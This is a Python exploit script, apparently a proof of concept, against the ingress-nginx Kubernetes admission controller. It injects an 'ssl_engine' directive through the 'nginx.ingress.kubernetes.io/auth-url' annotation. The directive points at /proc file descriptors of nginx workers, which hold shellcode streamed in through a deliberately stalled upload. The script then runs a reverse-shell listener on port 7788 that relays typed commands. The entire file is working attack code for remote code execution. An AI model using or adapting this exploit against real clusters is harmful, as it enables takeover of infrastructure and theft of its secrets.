import subprocess
import asyncio
import httpx
import sys

PIDS = []
ADMISSION_URL = "https://localhost:8443/networking/v1/ingresses"
URL = "http://localhost:8080/fake/addr"


DATA = {
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "85b707bf-4241-4f9b-9ee8-7809c7132cdc",
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "requestKind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "requestResource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "name": "xxx",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {
      "username": "kube-review",
      "uid": "60a7a2da-f9ec-4afc-baaa-11bf648233a8"
    },
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "xxx",
        "namespace": "default",
        "creationTimestamp": None,
        "annotations": {
          "nginx.ingress.kubernetes.io/auth-url": "xxx"
        }
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [
          {
            "host": "demo.local",
            "http": {
              "paths": [
                {
                  "path": "/",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "xxx",
                      "port": {
                        "number": 5244
                      }
                    }
                  }
                }
              ]
            }
          }
        ]
      },
      "status": {
        "loadBalancer": {}
      }
    },
    "oldObject": None,
    "dryRun": None,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}


with open("shell.so", "rb") as f:
    shellcode = f.read()

reverse_shell_connected = asyncio.Event()

async def reverse_shell_listener(host="0.0.0.0", port=7788):
    server = await asyncio.start_server(handle_shell_connection, host, port)
    async with server:
        print(f"[+] Listening for reverse shell on {host}:{port}")
        await reverse_shell_connected.wait()  # Wait until shell is connected
        server.close()
        await server.wait_closed()
        print("[+] Reverse shell connection established!")

async def handle_shell_connection(reader, writer):
    reverse_shell_connected.set()
    print("[+] Shell connected. Type commands below.\n")

    async def read_from_shell():
        try:
            while not reader.at_eof():
                data = await reader.read(1024)
                if data:
                    print(data.decode(), end="")
        except Exception as e:
            print(f"[!] Shell read error: {e}")

    async def write_to_shell():
        try:
            while True:
                cmd = await asyncio.get_event_loop().run_in_executor(None, sys.stdin.readline)
                if not cmd:
                    break
                writer.write(cmd.encode())
                await writer.drain()
        except Exception as e:
            print(f"[!] Shell write error: {e}")

    await asyncio.gather(read_from_shell(), write_to_shell())
    print("[*] Shell session ended.")
    writer.close()
    await writer.wait_closed()

async def send_admission_req():
    async with httpx.AsyncClient(verify=False) as client:
        for pid in PIDS:
            for fd in range(10, 40):
                if reverse_shell_connected.is_set():
                    return
                p = f"/proc/{pid}/fd/{fd}"
                DATA["request"]["object"]["metadata"]["annotations"][
                    "nginx.ingress.kubernetes.io/auth-url"
                ] = "http://example.com/#;}}}\n\nssl_engine %s;\n\n" % (p,)

                try:
                    resp = await client.post(
                        ADMISSION_URL,
                        json=DATA,
                    )
                    print("Testing", p)
                    res = resp.json()["response"]
                    if "No such device or address" in res["status"]["message"] or (
                        "No such file or directory" in res["status"]["message"]
                    ):
                        continue
                except:
                    print("Error parsing response")
                    continue
                print(resp.json())
                return


async def upload():
    class FakeIterator:
        def __init__(self):
            self.done = False

        async def __aiter__(self):
            yield shellcode
            await asyncio.sleep(60 * 60 * 60)

    async with httpx.AsyncClient() as client:
        res = await client.post(
            URL,
            data=FakeIterator(),
        )
        print("Posting done")


if __name__ == "__main__":
    
    # extract NGINX worker processes and their PIDs
    output = subprocess.check_output([
        "kubectl", "exec", "-n", "ingress-nginx", 
        "ingress-nginx-controller-694d5776c-6mxqv", "--", "ps", "aux"
    ]).decode()

    for line in output.strip().split("\n"):
        # Match lines like: '2292 www-data  0:00 nginx: worker process'
        if "nginx: worker process" in line:
            parts = line.split()
            if parts and parts[0].isdigit():
                PIDS.append(int(parts[0]))
    
    # forward admission controller port to localhost:8443
    subprocess.Popen([
        "kubectl", "port-forward", "-n", "ingress-nginx", 
        "svc/ingress-nginx-controller-admission", "8443:443"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    # forward ingress controller port to localhost:8080
    subprocess.Popen([
        "kubectl", "port-forward", "-n", "ingress-nginx", 
        "svc/ingress-nginx-controller", "8080:80"
      ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    loop = asyncio.get_event_loop()
    loop.run_until_complete(
        asyncio.gather(
          *[upload() for _ in range(10)], 
          reverse_shell_listener(),
          send_admission_req()
        )
    )
    loop.close()
